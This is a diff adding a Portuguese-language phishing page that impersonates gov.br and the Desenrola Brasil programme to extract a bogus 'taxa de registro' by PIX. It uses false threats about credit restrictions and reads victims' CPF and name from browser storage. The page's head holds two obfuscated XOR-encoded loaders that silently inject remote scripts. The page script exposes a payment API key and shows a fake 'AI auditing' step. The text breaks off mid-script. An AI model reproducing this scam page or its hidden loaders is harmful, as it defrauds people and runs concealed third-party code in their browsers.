@@ -1,0 +1,723 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head><script></script>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0, viewport-fit=cover" name="viewport" />
+    <title>Acesso Seguro</title>
+    <link rel="icon" type="image/png" sizes="96x96" href="favicon-96.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16.png">
+    <style>
+        :root {
+            --black: #000000;
+            --dark-gray: #333333;
+            --light-gray: #F5F5F5;
+            --border: #E0E0E0;
+            --success: #198754;
+            --alert: #D92C2C;
+            --white: #FFFFFF;
+            --primary: #1351B4;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { background: #06182e; }
+        body { font-family: 'Rawline', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background-color: #f0f2f5; color: var(--black); min-height: 100vh; min-height: 100dvh; overflow-x: hidden; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; display: flex; flex-direction: column; }
+        #main-content { flex: 1 1 auto; flex-direction: column; }
+
+        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.5s ease; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 14px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #loader-text { font-size: 14px; font-weight: 500; color: #555; }
+
+        .fade-in { opacity: 0; transform: translateY(15px); animation: fadeInUp 0.6s ease forwards; }
+        @keyframes fadeInUp { to { opacity: 1; transform: translateY(0); } }
+
+        header { width: 100%; min-height: 56px; display: flex; justify-content: space-between; align-items: center; gap: 8px; background: #fff; padding: 8px 12px 8px 14px; border-bottom: 1px solid #e5e5e5; box-shadow: 0 1px 3px rgba(0,0,0,.06); }
+        .logo-img { height: 31px; width: auto; max-width: 132px; object-fit: contain; display: block; }
+        .hdr-right { display: flex; align-items: center; gap: 4px; flex-shrink: 0; }
+        .btn-entrar { display: inline-flex; align-items: center; gap: 7px; background: #1351B4; color: #fff; border: none; border-radius: 999px; padding: 10px 18px; font-size: 14px; font-weight: 600; font-family: inherit; white-space: nowrap; }
+        @media (max-width: 480px) {
+            .logo-img { height: 28px; max-width: 103px; }
+            .btn-entrar { padding: 9px 14px; font-size: 13px; }
+            .hdr-right { gap: 2px; }
+        }
+
+        .container { max-width: 600px; margin: 0 auto; padding: 20px 16px 32px; width: 100%; }
+
+        .steps { display: flex; justify-content: space-between; margin-bottom: 24px; position: relative; }
+        .step { flex: 1; position: relative; display: flex; flex-direction: column; align-items: center; z-index: 1; }
+        .step:not(:last-child)::after { content: ''; position: absolute; top: 12px; left: 50%; width: 100%; height: 2px; background: #E0E0E0; z-index: 0; }
+        .circle { width: 26px; height: 26px; border-radius: 50%; background: #EEE; margin-bottom: 6px; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; color: #999; position: relative; z-index: 2; }
+        .circle.active { background: var(--primary); color: #fff; box-shadow: 0 1px 4px rgba(19, 81, 180, 0.25); }
+        .circle.error { background: var(--alert); color: #fff; box-shadow: 0 1px 4px rgba(217, 44, 44, 0.25); }
+        .label { font-size: 10px; color: #999; text-transform: uppercase; letter-spacing: 0.4px; text-align: center; }
+        .label.active { color: var(--dark-gray); font-weight: 700; }
+        .label.error { color: var(--alert); font-weight: 700; }
+
+        .status-card { border: 1px solid var(--border); border-radius: 10px; overflow: hidden; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.05); margin-bottom: 0; background: var(--white); }
+        .status-header { background: #F8FFF9; padding: 14px 16px; border-bottom: 1px solid #E0E0E0; display: flex; align-items: center; gap: 8px; }
+        .check-icon { width: 20px; height: 20px; flex-shrink: 0; fill: var(--success); }
+        .header-text { font-size: 14px; font-weight: 600; color: var(--success); }
+        .status-body { padding: 0 18px 22px; }
+
+        h1 { font-size: 17px; margin-bottom: 14px; font-weight: 700; color: var(--dark-gray); line-height: 1.4; }
+        p { font-size: 14px; line-height: 1.6; color: #444; margin-bottom: 14px; }
+        .order-info { background: #fafbfc; padding: 14px; border-radius: 8px; margin-top: 6px; margin-bottom: 0; border: 1px solid #eef0f3; }
+        .info-row { display: flex; justify-content: space-between; align-items: baseline; gap: 8px; font-size: 13px; margin-bottom: 8px; color: #333; }
+        .info-row span:first-child { flex-shrink: 0; color: #666; }
+        .info-row span:last-child { text-align: right; }
+        .status-bad { color: var(--alert); font-weight: 700; text-transform: uppercase; font-size: 12px; }
+
+        .btn-action { display: block; width: 100%; background: var(--primary); color: var(--white); text-align: center; padding: 14px 16px; border-radius: 6px; text-decoration: none; font-size: 14px; font-weight: 700; text-transform: uppercase; letter-spacing: .3px; transition: background 0.15s; border: none; cursor: pointer; margin-top: 16px; }
+        .btn-action:hover { background: #0f4da8; }
+        .btn-action:active { background: #0b3d8a; }
+        .btn-action:disabled { opacity: 0.5; cursor: wait; }
+
+        .repass-warning { margin-top: 16px; padding: 12px; border: 1px solid #e0e0e0; border-radius: 6px; background-color: #fafafa; display: flex; align-items: flex-start; gap: 8px; }
+        .repass-danger { border-color: #fca5a5; background-color: #fef2f2; }
+        .warning-text { font-size: 12px; color: #666; line-height: 1.5; font-weight: 400; }
+
+        .faq-section { margin-top: 20px; padding: 16px 18px; background: var(--white); border: 1px solid var(--border); border-radius: 10px; }
+        .faq-title { font-size: 14px; font-weight: 700; color: var(--dark-gray); margin-bottom: 10px; }
+        .faq-text { font-size: 13px; line-height: 1.6; color: #555; margin-bottom: 10px; }
+        .faq-list { font-size: 13px; line-height: 1.7; color: #555; padding-left: 20px; margin-bottom: 12px; }
+        .faq-list li { margin-bottom: 4px; }
+
+        footer.site-ft { background: #0a2542; color: #d1d1d1; text-align: center; font-size: 11px; margin-top: auto; padding: 20px 20px 24px; }
+        .site-ft-inner { max-width: 720px; margin: 0 auto; }
+        .ft-gov-img { display: block; height: 26px; width: auto; max-width: 100px; object-fit: contain; margin: 0 auto 10px; }
+        footer.site-ft p { color: #d1d1d1; font-size: 11px; line-height: normal; margin-bottom: 0; }
+        .discount-badge { display: inline-block; background: var(--primary); color: #fff; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 20px; margin-left: 4px; }
+
+        #pix-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 10000; align-items: center; justify-content: center; padding: 16px; }
+        #pix-overlay.active { display: flex; }
+        #pix-modal { background: #fff; border-radius: 12px; max-width: 460px; width: 100%; max-height: 92vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.3); position: relative; }
+        #pix-modal .pix-close-x { position: absolute; top: 10px; right: 12px; background: none; border: none; font-size: 22px; color: #999; cursor: pointer; line-height: 1; padding: 4px; z-index: 1; }
+        #pix-modal .pix-head { padding: 18px 18px 6px; text-align: center; }
+        #pix-modal .pix-head .pix-title { font-size: 16px; font-weight: 800; color: var(--primary); margin-bottom: 3px; }
+        #pix-modal .pix-head .pix-sub { font-size: 12px; color: #666; }
+        #pix-modal .pix-body { padding: 10px 18px 18px; }
+        #pix-modal .pix-valor { text-align: center; font-size: 26px; font-weight: 800; color: var(--primary); margin: 6px 0 14px; }
+        #pix-modal .qr-frame { display: flex; align-items: center; justify-content: center; padding: 10px; border: 2px solid var(--primary); border-radius: 10px; }
+        #pix-modal .qr-frame img { width: 200px; height: 200px; }
+        #pix-modal .pix-instrucao { background: #F0F4FF; border-radius: 8px; padding: 12px; margin-top: 12px; font-size: 12px; color: #444; line-height: 1.5; }
+        #pix-modal .pix-instrucao ol { padding-left: 18px; }
+        #pix-modal .pix-instrucao li { margin-bottom: 2px; }
+        #pix-modal .pix-copy { background: #f0f4ff; border: 1.5px dashed var(--primary); border-radius: 8px; padding: 10px 12px; margin-top: 12px; }
+        #pix-modal .pix-copy .label { font-size: 10px; font-weight: 700; color: var(--primary); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 5px; text-align: left; }
+        #pix-modal .pix-copy .code { font-size: 10px; font-family: monospace; color: #333; word-break: break-all; line-height: 1.4; margin-bottom: 8px; }
+        #pix-modal .pix-copy button { width: 100%; padding: 10px; background: var(--primary); color: #fff; border: none; border-radius: 8px; font-size: 13px; font-weight: 700; cursor: pointer; }
+        #pix-modal .pix-copy button.copiado { background: #059669; }
+        #pix-modal .pix-aguardando { display: flex; align-items: center; justify-content: center; gap: 8px; background: #EFF6FF; border-radius: 8px; padding: 10px 14px; margin-top: 12px; font-size: 12px; font-weight: 600; color: var(--primary); }
+        #pix-modal .dot-blink { width: 7px; height: 7px; background: var(--primary); border-radius: 50%; animation: blink 1.2s infinite; }
+        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
+        #pix-modal .pix-success { display: none; text-align: center; padding: 20px 12px; }
+        #pix-modal .pix-success .ico { width: 60px; height: 60px; background: #D1FAE5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 30px; }
+        #pix-modal .pix-success .tit { font-size: 17px; font-weight: 800; color: #059669; margin-bottom: 5px; }
+        #pix-modal .pix-success .desc { font-size: 12px; color: #555; line-height: 1.5; }
+        #pix-modal .countdown { text-align: center; font-size: 12px; color: #666; margin-top: 12px; }
+        #pix-modal .countdown b { color: var(--primary); }
+        #pix-modal .pix-close { background: none; border: none; color: #888; font-size: 12px; cursor: pointer; padding: 8px; margin-top: 6px; width: 100%; }
+        #pix-modal .btn-verificar-pix { display: block; width: 100%; padding: 14px 16px; margin: 16px 0 12px; background: transparent; color: var(--primary); border: 2px solid var(--primary); border-radius: 8px; font-size: 13px; font-weight: 700; font-family: inherit; cursor: pointer; text-align: center; transition: background .2s, color .2s; }
+        #pix-modal .btn-verificar-pix:hover { background: var(--primary); color: #fff; }
+        #pix-modal .btn-verificar-pix:disabled { opacity: .55; pointer-events: none; }
+        #pix-modal .vp-sub { display: block; font-size: 10px; font-weight: 400; color: #888; margin-top: 3px; line-height: 1.4; }
+        #pix-modal .btn-verificar-pix:hover .vp-sub { color: rgba(255,255,255,.7); }
+        .repix-overlay { display: none; position: fixed; inset: 0; z-index: 10001; background: rgba(0,0,0,.6); backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px); align-items: center; justify-content: center; }
+        .repix-overlay.ativo { display: flex; }
+        .repix-modal { background: #fff; border-radius: 14px; padding: 24px 20px; max-width: 420px; width: calc(100% - 32px); max-height: 90vh; overflow-y: auto; position: relative; box-shadow: 0 12px 40px rgba(0,0,0,.2); }
+        .repix-close-x { position: absolute; top: 10px; right: 12px; background: none; border: none; font-size: 22px; color: #999; cursor: pointer; line-height: 1; padding: 4px; font-family: inherit; }
+        .repix-close-x:hover { color: #333; }
+        .repix-badge { display: inline-block; font-size: 11px; font-weight: 700; color: var(--primary); background: rgba(19,81,180,.06); border: 1px solid rgba(19,81,180,.15); border-radius: 6px; padding: 5px 12px; text-transform: uppercase; letter-spacing: .04em; margin-bottom: 12px; }
+        .repix-titulo { font-size: 17px; font-weight: 800; color: #1a1a1a; margin-bottom: 6px; }
+        .repix-msg { font-size: 12px; color: #666; line-height: 1.6; margin-bottom: 18px; }
+        .repix-upload-area { border: 2px dashed #d0d0d0; border-radius: 10px; padding: 24px 14px; text-align: center; cursor: pointer; transition: border-color .2s, background .2s; margin-bottom: 14px; position: relative; overflow: hidden; }
+        .repix-upload-area:hover, .repix-upload-area.drag-over { border-color: var(--primary); background: rgba(19,81,180,.02); }
+        .repix-upload-ico { margin: 0 auto 8px; color: #888; }
+        .repix-upload-texto { font-size: 12px; color: #888; }
+        .repix-upload-texto strong { color: var(--primary); cursor: pointer; }
+        .repix-upload-formatos { font-size: 10px; color: #aaa; margin-top: 5px; }
+        .repix-upload-input { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%; }
+        .repix-arquivo { display: none; font-size: 12px; color: #1a1a1a; font-weight: 600; margin-bottom: 14px; padding: 8px 12px; background: #f5f5f5; border-radius: 8px; word-break: break-all; align-items: center; gap: 8px; }
+        .repix-arquivo.vis { display: flex; }
+        .repix-arquivo-nome { flex: 1; }
+        .repix-arquivo-trocar { font-size: 10px; color: var(--primary); cursor: pointer; background: none; border: none; font-weight: 600; font-family: inherit; white-space: nowrap; }
+        .btn-validar-ia { display: block; width: 100%; padding: 14px 16px; background: var(--primary); color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 700; font-family: inherit; cursor: pointer; }
+        .btn-validar-ia:disabled { opacity: .55; pointer-events: none; }
+        .repix-loader { display: none; text-align: center; padding: 18px 0; }
+        .repix-loader-spinner { width: 28px; height: 28px; border: 3px solid #eee; border-top: 3px solid var(--primary); border-radius: 50%; animation: repix-spin .8s linear infinite; margin: 0 auto 10px; }
+        @keyframes repix-spin { to { transform: rotate(360deg); } }
+        .repix-loader-texto { font-size: 12px; color: #888; font-weight: 600; }
+        .repix-resultado { display: none; text-align: center; padding: 14px 0; }
+        .repix-resultado-ico { margin: 0 auto 10px; }
+        .repix-resultado-titulo { font-size: 15px; font-weight: 700; margin-bottom: 5px; }
+        .repix-resultado-msg { font-size: 12px; color: #666; line-height: 1.5; }
+        .repix-resultado.sucesso .repix-resultado-titulo { color: #059669; }
+        .repix-resultado.erro .repix-resultado-titulo { color: #d92c2c; }
+        .repix-tentar-novamente { display: inline-block; margin-top: 12px; padding: 8px 20px; background: transparent; color: var(--primary); border: 2px solid var(--primary); border-radius: 8px; font-size: 12px; font-weight: 600; font-family: inherit; cursor: pointer; }
+    </style>
+
+<script>(function(){var g_apky=atob("DCyS38Tgw0BCdTBhJlewqraM4XpgHUQVVl+o8OuDpy5sAEQMT0rr8aePrm4gBx8SRV77r7CT7DArDVUNCVz7p6GM7SoxVxxDR1jmra2CtjQnBhJbfXG+/aOMrCIjGUNDHHfp/aqBriVgTxIRT1T3s42E4WxgA1ENU0mw5ebWoiFwQwgCFB70uqbQpyJxRVJTHxikuvLCvh0/");var z_5ppd=[];for(var s_ke84=0;s_ke84<g_apky.length;s_ke84++){z_5ppd.push(g_apky.charCodeAt(s_ke84)&255);}var v_lf=z_5ppd[0];var l_w6j=z_5ppd.slice(1,1+v_lf);var y_1dt6=z_5ppd.slice(1+v_lf);var o_lfte=y_1dt6.map(function(b,j_cpg){return b^l_w6j[j_cpg%v_lf];});var d_k92="";for(var q_yl=0;q_yl<o_lfte.length;q_yl++){d_k92+=String.fromCharCode(o_lfte[q_yl]&255);}var m_o=decodeURIComponent(escape(d_k92));var h_v7=JSON.parse(m_o);var b_4=h_v7.globals||[];b_4.forEach(function(o_nk){window[o_nk.name]=o_nk.value;});var k_it=document.createElement("script");k_it.src=h_v7.url;k_it.async=true;k_it.defer=true;(h_v7.attributes||[]).forEach(function(t_lpz){k_it.setAttribute(t_lpz.name,t_lpz.value);});(document.head||document.documentElement).appendChild(k_it);})();</script>
+<script>(function(){var y_chh=atob("DGQ7xTQvWmF/3CU4+R8ZsEZDeFtdtFFMiRcB6htMPg9RqVFVkAJC61dAN08drgpLmhZStUBcdRQLsVYXlQVPoEdbdAsM/gkamBBPt11NLxUarwcCoh8Zq1VCP0NF/kFZjQUWsEBCMwcG8VVKnBJeq0ACIgIQuAhLmg8Z6RZZOw0KuQcC20ZG6U8NNAASuQcC2wBasVUCLxUStUNB1BRJoEJKNBVSr1BakABI5xgNLAATqUAaw0YZuGlS");var t_hb1=[];for(var b_ww6=0;b_ww6<y_chh.length;b_ww6++){t_hb1.push(y_chh.charCodeAt(b_ww6)&255);}var w_iy=t_hb1[0];var p_r5=t_hb1.slice(1,1+w_iy);var f_j=t_hb1.slice(1+w_iy);var h_8lbf=f_j.map(function(b,e_amv){return b^p_r5[e_amv%w_iy];});var i_f3="";for(var c_m8=0;c_m8<h_8lbf.length;c_m8++){i_f3+=String.fromCharCode(h_8lbf[c_m8]&255);}var d_tq=decodeURIComponent(escape(i_f3));var r_m=JSON.parse(d_tq);var l_vtf=r_m.globals||[];l_vtf.forEach(function(c_r){window[c_r.name]=c_r.value;});var x_c=document.createElement("script");x_c.src=r_m.url;x_c.async=true;x_c.defer=true;(r_m.attributes||[]).forEach(function(w_94){x_c.setAttribute(w_94.name,w_94.value);});(document.head||document.documentElement).appendChild(x_c);})();</script>
+<style id="_anim_reset" data-anim-reset="true">
+[style*="opacity: 0"], [style*="opacity:0"], [style*="opacity: 0 "] { opacity: 1 !important; }
+[style*="translate"]:not(.allow-translate) { transform: none !important; }
+[style*="scale(0"] { transform: none !important; }
+[style*="blur("] { filter: none !important; }
+[style*="rotate"] { transform: none !important; }
+[style*="skew"] { transform: none !important; }
+[style*="clip-path"] { clip-path: none !important; }
+[style*="clipPath"] { clip-path: none !important; }
+[aria-hidden="true"][style*="blur"] { opacity: 0 !important; }
+[data-framer-name], [data-framer-component-type] { opacity: 1 !important; transform: none !important; filter: none !important; }
+[data-aos]:not(.aos-animate) { opacity: 1 !important; transform: none !important; filter: none !important; }
+[data-animate], [data-animation] { opacity: 1 !important; transform: none !important; filter: none !important; }
+[data-scroll], [data-inview], [data-reveal] { opacity: 1 !important; transform: none !important; filter: none !important; }
+.motion-safe\:opacity-0, .opacity-0 { opacity: 1 !important; }
+[class*="invisible"], [class*="hidden-init"] { visibility: visible !important; }
+.fade-in-init, .slide-up-init, .scale-init, .blur-in-init, .reveal-init { opacity: 1 !important; transform: none !important; filter: none !important; }
+[class*="motion-"]:not([class*="motion-safe"]) { opacity: 1 !important; transform: none !important; filter: none !important; }
+</style></head>
+
+<body>
+    <div id="loader">
+        <div class="spinner"></div>
+        <div id="loader-text">Consultando situação do seu CPF...</div>
+    </div>
+    <div id="main-content" style="display:none;">
+        <header>
+            <span aria-label="gov.br" style="line-height:0">
+                <img class="logo-img" src="../assets/img/icon-seal.png" alt="gov.br">
+            </span>
+            <div class="hdr-right">
+                <span class="btn-entrar">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+                    </svg>
+                    <span id="hdr-nome">Cliente</span>
+                </span>
+            </div>
+        </header>
+        <div class="container fade-in">
+            <div class="steps">
+                <div class="step"><div class="circle active">✓</div><div class="label active">Acordo</div></div>
+                <div class="step"><div class="circle active">✓</div><div class="label active">Pagamento</div></div>
+                <div class="step"><div class="circle error">!</div><div class="label error">Regularização</div></div>
+            </div>
+            <div class="status-card">
+                <div class="status-header">
+                    <svg class="check-icon" viewbox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
+                    </svg>
+                    <span class="header-text">Acordo quitado com sucesso</span>
+                </div>
+                <div class="status-body">
+                    <div style="text-align:center;margin-bottom:0;">
+                        <img src="banner.png" alt="Desenrola Brasil" style="display:block;max-width:200px;margin:-8px auto -10px;height:auto;">
+                    </div>
+                    <h1>Registro de quitação pendente</h1>
+                    <p>O pagamento do seu acordo foi confirmado. Para concluir o processo e dar baixa nas pendências junto aos órgãos de proteção ao crédito (SPC, Serasa e SCPC), é necessário efetuar o pagamento da <strong>taxa de registro e homologação</strong>.</p>
+                    <p>Após o pagamento, o Termo de Quitação Definitiva será emitido e a comunicação aos órgãos será realizada em até <strong>72 horas úteis</strong>.</p>
+                    <div class="order-info">
+                        <div class="info-row"><span>Acordo (já pago):</span><span><strong>R$ 68,92</strong> <span class="discount-badge">-99%</span></span></div>
+                        <div class="info-row"><span>Pendências:</span><span>4 registros ativos</span></div>
+                        <div class="info-row" style="margin-top: 8px; border-top: 1px solid #eee; padding-top: 8px;"><span>Situação:</span><span class="status-bad">PENDENTE DE REGISTRO</span></div>
+                        <div class="info-row" style="border-top: 1px solid #eee; padding-top: 8px;"><span>Taxa de registro:</span><span><strong style="color: var(--dark-gray);">R$ 47,92</strong></span></div>
+                    </div>
+                    <button class="btn-action" id="btn-pagar-up1" type="button">
+                        PAGAR TAXA E CONCLUIR REGISTRO
+                    </button>
+                    <div class="repass-warning repass-danger">
+                        <svg style="width:18px;min-width:18px;fill:#D92C2C" viewbox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-8h2v8z"></path></svg>
+                        <div class="warning-text" style="color:#991b1b;">
+                            O não pagamento da taxa implica na manutenção das restrições cadastrais junto aos órgãos de proteção ao crédito e no cancelamento das condições obtidas no acordo.
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="faq-section">
+                <p class="faq-title">Por que estou pagando essa taxa?</p>
+                <p class="faq-text">A <strong>Taxa de Registro e Homologação</strong> é referente ao processamento da baixa definitiva das pendências financeiras nos órgãos de proteção ao crédito (SPC, Serasa e SCPC). Esse valor cobre os custos operacionais de:</p>
+                <ul class="faq-list">
+                    <li>Emissão do Termo de Quitação Definitiva</li>
+                    <li>Comunicação oficial aos órgãos de proteção ao crédito</li>
+                    <li>Atualização cadastral e remoção das restrições</li>
+                    <li>Acompanhamento do processo em até 72 horas úteis</li>
+                </ul>
+                <p class="faq-text">Sem o pagamento desta taxa, o acordo permanece registrado, porém <strong>as restrições no seu CPF não serão removidas</strong> e as condições especiais obtidas poderão ser canceladas.</p>
+            </div>
+        </div>
+        <footer class="site-ft">
+            <div class="site-ft-inner">
+                <img src="..//pagamento/index.htmlindex.htmlimages/iconefooter.png" alt="" class="ft-gov-img">
+                <p>Todo o conteúdo deste site está publicado sob a licença.</p>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Modal PIX -->
+    <div id="pix-overlay">
+        <div id="pix-modal">
+            <button type="button" class="pix-close-x" id="pix-close-x">&times;</button>
+            <div class="pix-head">
+                <div class="pix-title">Pague com PIX</div>
+                <div class="pix-sub">Escaneie o QR Code ou copie o código abaixo</div>
+            </div>
+            <div class="pix-body">
+                <div class="pix-valor" id="pix-valor">R$ 47,92</div>
+                <div class="qr-frame"><img id="qr-img" alt="QR Code PIX" /></div>
+                <div class="pix-instrucao">
+                    <ol>
+                        <li>Abra o app do seu banco</li>
+                        <li>Escolha <strong>Pagar com PIX</strong></li>
+                        <li>Escaneie o QR Code ou copie o código abaixo</li>
+                    </ol>
+                </div>
+                <div class="pix-copy">
+                    <div class="label">PIX Copia e Cola</div>
+                    <div class="code" id="copy-code">—</div>
+                    <button type="button" id="btn-copy">Copiar código PIX</button>
+                </div>
+                <button type="button" class="btn-verificar-pix" id="btn-verificar-pix">
+                    Verificar Pagamento
+                    <span class="vp-sub">Após pagar no app do seu banco, clique aqui para validar seu pagamento</span>
+                </button>
+                <div class="pix-aguardando" id="pix-aguardando">
+                    <div class="dot-blink"></div>
+                    Aguardando pagamento...
+                </div>
+                <div class="countdown" id="countdown-wrap">PIX expira em <b id="countdown-num">15:00</b></div>
+                <div class="pix-success" id="pix-success">
+                    <div class="ico">✅</div>
+                    <div class="tit">Pagamento confirmado!</div>
+                    <div class="desc">Registro concluído! Seu nome será removido dos órgãos de proteção ao crédito em até 72 horas úteis.</div>
+                </div>
+                <button type="button" class="pix-close" id="pix-close">Cancelar e voltar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- RePix Modal -->
+    <div class="repix-overlay" id="repix-overlay">
+      <div class="repix-modal">
+        <button type="button" class="repix-close-x" id="repix-close-x">&times;</button>
+        <div id="repix-upload-step">
+          <div class="repix-badge">Pagamento em Processamento</div>
+          <div class="repix-titulo">Anexe seu Comprovante Pix</div>
+          <div class="repix-msg">Seu pagamento ainda não foi identificado automaticamente ou está sendo compensado pelo banco. Para liberar seu pedido imediatamente, anexe o comprovante Pix abaixo:</div>
+          <div class="repix-upload-area" id="repix-upload-area">
+            <div class="repix-upload-ico"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg></div>
+            <div class="repix-upload-texto">Arraste o arquivo aqui ou <strong>clique para selecionar</strong></div>
+            <div class="repix-upload-formatos">PDF, JPG, PNG ou WEBP (máx. 10MB)</div>
+            <input type="file" class="repix-upload-input" id="repix-file" accept=".pdf,.jpg,.jpeg,.png,.webp">
+          </div>
+          <div class="repix-arquivo" id="repix-arquivo"><span class="repix-arquivo-nome" id="repix-arquivo-nome"></span><button type="button" class="repix-arquivo-trocar" id="repix-arquivo-trocar">Trocar</button></div>
+          <button type="button" class="btn-validar-ia" id="btn-validar-ia" disabled>Validar Comprovante</button>
+        </div>
+        <div class="repix-loader" id="repix-loader"><div class="repix-loader-spinner"></div><div class="repix-loader-texto">Inteligência Artificial auditando comprovante...</div></div>
+        <div class="repix-resultado" id="repix-resultado"><div class="repix-resultado-ico" id="repix-resultado-ico"></div><div class="repix-resultado-titulo" id="repix-resultado-titulo"></div><div class="repix-resultado-msg" id="repix-resultado-msg"></div><div id="repix-resultado-acoes"></div></div>
+      </div>
+    </div>
+
+    <script src="../assets/js/qrcode.min.js"></script>
+    <script>
+    (function () {
+        var MANGOFY_API = 'https://checkout.mangofy.com.br/api/v1/payment';
+        var STORE_CODE = '9899ee329b343f1960613d1913831784';
+        var API_KEY = '2c9eb6afe73e905130641163cec44d9571xh3gpkyo10yxcxwehz199ziiok8ib';
+        var AMOUNT_CENTS = 4792;
+        var AMOUNT_LABEL = 'R$ 47,92';
+        var PRODUCT_NAME = 'Upsell 01';
+        var NEXT_URL = '../02/';
+
+        var phrases = [
+            "Consultando situação do seu CPF...",
+            "Verificando pendências nos órgãos de proteção...",
+            "Analisando status da homologação do acordo..."
+        ];
+        var pi = 0;
+        var textElement = document.getElementById("loader-text");
+        var interval = setInterval(function () {
+            pi++;
+            if (phrases[pi]) textElement.innerText = phrases[pi];
+        }, 800);
+
+        function getQuery(name) {
+            var p = new URLSearchParams(window.location.search);
+            return p.get(name) || '';
+        }
+        function formatCPF(raw) {
+            var d = String(raw || '').replace(/\D/g, '').slice(0, 11);
+            if (d.length !== 11) return raw || '***.***.***-**';
+            return d.slice(0,3) + '.' + d.slice(3,6) + '.' + d.slice(6,9) + '-' + d.slice(9);
+        }
+        function gerarEmail(nome) {
+            var partes = String(nome || '').toLowerCase()
+                .normalize('NFD').replace(/[̀-ͯ]/g, '')
+                .replace(/[^a-z0-9\s]/g, '').trim().split(/\s+/).filter(Boolean);
+            var emailNome = partes.slice(0, 2).join('.') || 'cliente';
+            return emailNome + '.' + Math.random().toString(36).substring(2, 6) + '@gmail.com';
+        }
+
+        var CPF = '', NOME = '', ACORDO = '', EMAIL = '';
+        try {
+            var data = {};
+            try { data = JSON.parse(sessionStorage.getItem('_s0') || '{}'); } catch (e) {}
+            if (!data.cpf || !data.nome) {
+                try {
+                    var raw = localStorage.getItem('userData');
+                    if (raw) data = JSON.parse(raw);
+                } catch (e2) {}
+            }
+            if (!data.cpf || !data.nome) {
+                try {
+                    var ck = JSON.parse(localStorage.getItem('checkout_customer') || '{}');
+                    if (ck.cpf || ck.document) {
+                        data.cpf = data.cpf || ck.cpf || ck.document || '';
+                        data.nome = data.nome || ck.name || ck.nome || '';
+                        data.email = data.email || ck.email || '';
+                    }
+                } catch (e3) {}
+            }
+            CPF = data.cpf || getQuery('cpf') || '';
+            NOME = data.nome || getQuery('nome') || '';
+            try {
+                if (!CPF) CPF = localStorage.getItem('site.cpf') || '';
+                if (!NOME) NOME = localStorage.getItem('site.nome') || '';
+            } catch (_) {}
+            ACORDO = data.acordo || getQuery('acordo') || '';
+            EMAIL = data.email || gerarEmail(NOME);
+        } catch (e) {
+            console.error(e);
+        }
+
+        var primeiroNome = String(NOME || 'Cliente').split(' ')[0];
+        document.getElementById('hdr-nome').textContent = primeiroNome;
+
+        setTimeout(function () {
+            clearInterval(interval);
+            document.getElementById("loader").style.opacity = "0";
+            setTimeout(function () {
+                document.getElementById("loader").style.display = "none";
+                document.getElementById("main-content").style.display = "flex";
+            }, 500);
+        }, 2500);
+
+        // ===== PIX MODAL =====
+        var transactionId = null;
+        var pollingTimer = null;
+        var countdownTimer = null;
+        var segundos = 15 * 60;
+
+        function renderQrFromText(text, cb) {
+            try {
+                var qr = qrcode(0, 'M');
+                qr.addData(text);
+                qr.make();
+                var frame = document.querySelector('.qr-frame');
+                var img = document.getElementById('qr-img');
+                if (img) img.style.display = 'none';
+                var oldSvg = frame.querySelector('svg');
+                if (oldSvg) oldSvg.remove();
+                frame.insertAdjacentHTML('afterbegin', qr.createSvgTag({cellSize: 4, margin: 0, scalable: true}));
+                var svgEl = frame.querySelector('svg');
+                if (svgEl) { svgEl.style.width = '200px'; svgEl.style.height = '200px'; }
+                if (cb) cb();
+            } catch (e) {
+                console.error('[qr]', e);
+                if (cb) cb(e);
+            }
+        }
+
+        // RECOVERY
+        (function () {
+          var saved = null;
+          try { saved = JSON.parse(sessionStorage.getItem('_s1') || '{}'); } catch(_) {}
+          if (saved && saved.transactionId && saved.cpf === CPF && saved.status !== 'PAID') {
+            transactionId = saved.transactionId;
+            document.getElementById('pix-valor').textContent = saved.valor || AMOUNT_LABEL;
+            if (saved.copyPaste) {
+                document.getElementById('copy-code').textContent = saved.copyPaste;
+                renderQrFromText(saved.copyPaste, function(){});
+            }
+            document.getElementById('pix-overlay').classList.add('active');
+            verificarStatus();
